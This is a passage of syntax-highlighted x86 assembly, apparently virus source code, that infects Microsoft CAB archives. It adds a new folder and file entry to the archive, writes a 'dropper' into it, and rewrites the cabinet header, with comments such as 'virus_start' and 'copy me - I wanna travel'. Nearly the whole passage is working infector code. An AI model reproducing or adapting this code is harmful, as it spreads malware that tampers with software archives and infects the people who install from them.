        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc5">__cab_search</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__cab_searched</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,(</span><span class="sc5">CABf_FileName</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">CAB_file_start</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">repnz</span><span class="sc0">   </span><span class="sc6">scasb</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">__cab_search</span><span class="sc0">
    </span><span class="sc5">__cab_searched</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">

        </span><span class="sc1">; update file in folder</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc5">.</span><span class="sc4">(</span><span class="sc5">CABh_nFolders</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">CAB_header_start</span><span class="sc4">)</span><span class="sc0">

        </span><span class="sc1">; make place for new file struct</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,(</span><span class="sc5">CAB_entry</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">CAB_file_start</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc5">FileHeaderSize</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc5">mem_buffer</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__movsd_back</span><span class="sc0">

        </span><span class="sc1">; save offset of the file struct</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">00000004h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">CAB_file_start</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc5">.</span><span class="sc4">(</span><span class="sc5">CABf_Flags</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">CAB_file_start</span><span class="sc4">),</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,(</span><span class="sc5">CAB_entry</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">CAB_file_start</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">

        </span><span class="sc1">; modify files - ESI=next file struct</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">         </span><span class="sc1">;files to modify</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc5">__cab_search_2</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__cab_searched_2</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,(</span><span class="sc5">CABf_FileName</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">CAB_file_start</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">repnz</span><span class="sc0">   </span><span class="sc6">scasb</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">__cab_search_2</span><span class="sc0">
    </span><span class="sc5">__cab_searched_2</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">

        </span><span class="sc1">; change CAB header</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc5">.</span><span class="sc0"> \   </span><span class="sc1">;add new folder</span><span class="sc0">
            </span><span class="sc4">(</span><span class="sc5">CABh_nFolders</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">CAB_header_start</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc5">.</span><span class="sc0"> \   </span><span class="sc1">;add new files</span><span class="sc0">
            </span><span class="sc4">(</span><span class="sc5">CABh_nFiles</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">CAB_header_start</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc5">.</span><span class="sc0"> \
            </span><span class="sc4">(</span><span class="sc5">CABh_FileSize</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">CAB_header_start</span><span class="sc4">),</span><span class="sc5">DropperFullSize</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc5">.</span><span class="sc0"> \
            </span><span class="sc4">(</span><span class="sc5">CABh_FirstRec</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">CAB_header_start</span><span class="sc4">),</span><span class="sc0"> \
            </span><span class="sc5">CAB_file_start</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">CAB_directory_start</span><span class="sc0">

        </span><span class="sc1">; ESI=the beginning of the data</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc5">mem_buffer</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc1">; allocate memory for dropper</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc5">FileSize</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">DropperFullSize</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__malloc</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">cab_buffer</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc1">; change folder's values</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc5">my_Folder</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">FileSize</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,(</span><span class="sc5">CAB_entry</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">CAB_directory_start</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">       </span><span class="sc1">;offset to the 1st entry</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc2">0001h</span><span class="sc0">  </span><span class="sc1">;number of blocks</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">6</span><span class="sc4">],</span><span class="sc2">0000h</span><span class="sc0">  </span><span class="sc1">;type of compress</span><span class="sc0">

        </span><span class="sc1">; read CAB file - set pointer</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00000000h</span><span class="sc0">       </span><span class="sc1">;FILE_BEGIN defined in WinBase.H</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00000000h</span><span class="sc0">       </span><span class="sc1">;bigger then 2^64-2 ?</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,(</span><span class="sc5">CAB_entry</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">CAB_directory_start</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;new position</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">FileHandle</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">SetFilePointer</span><span class="sc0">

        </span><span class="sc1">; read CAB file to &lt;cab_buffer&gt;</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00000000h</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">last_error</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">FileSize</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,(</span><span class="sc5">CAB_entry</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">CAB_directory_start</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">cab_buffer</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">FileHandle</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ReadFile</span><span class="sc0">

        </span><span class="sc1">; create new block and copy dropper</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc5">cab_buffer</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc5">FileSize</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,(</span><span class="sc5">CAB_entry</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">CAB_directory_start</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">CAB_entry</span><span class="sc0">        </span><span class="sc1">;create new block</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,(</span><span class="sc5">CABe_Compr_data</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">CAB_entry</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Title_Message</span><span class="sc0">    </span><span class="sc1">;change on your</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">DropperSize</span><span class="sc0">         </span><span class="sc1">;virus_start !!</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

        </span><span class="sc1">; now, I must write CAB header with new folder + struct</span><span class="sc0">
        </span><span class="sc1">; and with modified all file structs - wow !!</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00000000h</span><span class="sc0">       </span><span class="sc1">;FILE_BEGIN defined in WinBase.H</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00000000h</span><span class="sc0">       </span><span class="sc1">;bigger then 2^64-2 ?</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00000000h</span><span class="sc0">       </span><span class="sc1">;start of the file</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">FileHandle</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">SetFilePointer</span><span class="sc0">

        </span><span class="sc1">; write header + file structs</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00000000h</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">last_error</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">         </span><span class="sc1">;number of bytes to write</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">mem_buffer</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;place in memory</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">FileHandle</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">WriteFile</span><span class="sc0">

        </span><span class="sc1">; set pointer to write dropper</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00000000h</span><span class="sc0">       </span><span class="sc1">;FILE_BEGIN defined in WinBase.H</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00000000h</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">FileHandle</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">SetFilePointer</span><span class="sc0">

        </span><span class="sc1">; ...and write my dropper</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00000000h</span><span class="sc0">       </span><span class="sc1">;bigger then 2^64-2</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">last_error</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">FileSize</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,(</span><span class="sc5">CABe_Compr_data</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">CAB_directory_start</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> \
                </span><span class="sc5">DropperSize</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;number of bytes to write</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">cab_buffer</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;place in memory</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">FileHandle</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;handle</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">WriteFile</span><span class="sc0">

        </span><span class="sc1">; close file</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">FileHandle</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CloseHandle</span><span class="sc0">

        </span><span class="sc1">; dealloc memory</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc5">cab_buffer</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__mdealloc</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc5">mem_buffer</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__mdealloc</span><span class="sc0">

        </span><span class="sc1">; show message</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">MB_OK</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">MB_ICONINFORMATION</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Title_Message</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Success_Message</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00000000h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">MessageBoxA</span><span class="sc0">

    </span><span class="sc5">__cab_finish</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00000000h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ExitProcess</span><span class="sc0">

    </span><span class="sc5">__cab_error</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">MB_OK</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">MB_ICONSTOP</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Title_Message</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Error_Message</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00000000h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">MessageBoxA</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">__cab_finish</span><span class="sc0">

</span><span class="sc1">;ÄÄÄ´ memory operations ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

</span><span class="sc5">__malloc</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">PAGE_READWRITE</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">MEM_COMMIT</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">VirtualAlloc</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">__mdealloc</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">MEM_DECOMMIT</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">VirtualFree</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">__rnd_number</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">in</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">          </span><span class="sc1">;very simple random</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">           </span><span class="sc1">;generator intead this</span><span class="sc0">
        </span><span class="sc6">in</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">41h</span><span class="sc0">          </span><span class="sc1">;use yours</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">rol</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">16</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0A72Fh</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">__movsd_back</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">         </span><span class="sc1">;my special move function</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">         </span><span class="sc1">;input: ECX=bytes to move</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">         </span><span class="sc1">;   ESI=source</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">         </span><span class="sc1">;   EDI=destination</span><span class="sc0">
        </span><span class="sc6">std</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">         </span><span class="sc1">;NOTE:  ESI and EDI ain't</span><span class="sc0">
        </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">__mb_nomovsb</span><span class="sc0">        </span><span class="sc1">;   real addresses - to</span><span class="sc0">
        </span><span class="sc6">movsb</span><span class="sc0">               </span><span class="sc1">;   undestand see on the</span><span class="sc0">
    </span><span class="sc5">__mb_nomovsb</span><span class="sc4">:</span><span class="sc0">               </span><span class="sc1">;   fourth instructions</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__mb_finish</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">
        </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">__mb_nomovsw</span><span class="sc0">
        </span><span class="sc6">movsw</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__mb_finish</span><span class="sc0">
    </span><span class="sc5">__mb_nomovsw</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">00000002h</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">00000002h</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsd</span><span class="sc0">           </span><span class="sc1">;copy me - I wanna travel</span><span class="sc0">
    </span><span class="sc5">__mb_finish</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ÄÄÄ´ archive structure ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

    </span><span class="sc5">CAB_header_start</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">CABh_Magic</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'MSCF'</span><span class="sc0">          </span><span class="sc1">;"MSCF" signature</span><span class="sc0">
</span><span class="sc5">CABh_Reserved1</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">       </span><span class="sc1">;reserved</span><span class="sc0">
</span><span class="sc5">CABh_FileSize</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">       </span><span class="sc1">;file size of this cabinet</span><span class="sc0">
